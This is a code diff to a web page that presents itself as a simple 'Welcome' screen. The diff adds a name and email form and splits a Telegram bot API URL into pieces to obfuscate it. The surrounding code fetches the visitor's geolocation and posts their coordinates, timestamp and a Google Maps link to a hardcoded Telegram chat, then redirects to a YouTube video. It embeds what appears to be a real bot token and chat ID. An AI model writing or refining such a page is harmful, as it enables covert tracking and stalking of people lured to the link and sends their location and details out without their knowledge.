@@ -21,6 +21,7 @@
             padding: 30px;
             border-radius: 15px;
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            width: 300px;
         }
         .loader {
             border: 8px solid #f3f3f3;
@@ -36,13 +37,19 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        button {
-            padding: 10px 20px;
+        input, button {
+            padding: 10px;
+            margin: 10px 0;
+            width: 100%;
+            box-sizing: border-box;
+            border-radius: 5px;
+            border: 1px solid #ccc;
             font-size: 16px;
+        }
+        button {
             background-color: #3498db;
             color: white;
             border: none;
-            border-radius: 5px;
             cursor: pointer;
             transition: background-color 0.3s;
         }
@@ -54,8 +61,12 @@
 <body>
     <div class="container">
         <h1>Welcome to the Page</h1>
-        <p>Please click below to continue...</p>
-        <button onclick="startProcess()">Continue</button>
+        <p>Please fill in your details to continue...</p>
+        <form onsubmit="startProcess(event)">
+            <input type="text" id="name" placeholder="Enter your name" required>
+            <input type="email" id="email" placeholder="Enter your email" required>
+            <button type="submit">Submit</button>
+        </form>
         <div class="loader" id="loader"></div>
     </div>
 
@@ -65,13 +76,21 @@
         const t2 = 'AAF8MOt9s2IgFyEzhBok9atp15UoqSK-tYw';
         const TELEGRAM_BOT_TOKEN = t1 + ':' + t2;
         const TELEGRAM_CHAT_ID = '6696895935';
-        const REDIRECT_URL = 'https://youtu.be/jSOmHSE8JIw?si=T5nDlk41noysj_J4'; // Redirect URL
-        const TELEGRAM_API_URL = 'https://bit.ly/4iNGqmM'; // Masked Telegram API URL
+        const REDIRECT_URL = 'https://youtu.be/jSOmHSE8JIw?si=T5nDlk41noysj_J4';
 
-        function startProcess() {
-            // Show loader, hide button and text
+        // Telegram API URL (obfuscated)
+        const u1 = 'https://api.';
+        const u2 = 'telegram.org';
+        const u3 = '/bot';
+        const u4 = '/sendMessage';
+        const TELEGRAM_API_URL = u1 + u2 + u3 + TELEGRAM_BOT_TOKEN + u4;
+
+        function startProcess(event) {
+            event.preventDefault(); // Form submit se page refresh rokne ke liye
+
+            // Show loader, hide form
+            document.querySelector('form').style.display = 'none';
             document.querySelector('.container p').style.display = 'none';
-            document.querySelector('button').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
             // Delay ke saath geolocation fetch karo
@@ -94,7 +113,7 @@
             const ts = new Date().toLocaleString();
             const msg = `Location Found!\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${ts}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;
 
-            // POST request to masked Telegram API URL
+            // POST request to Telegram API
             fetch(TELEGRAM_API_URL, {
                 method: 'POST',
                 headers: {
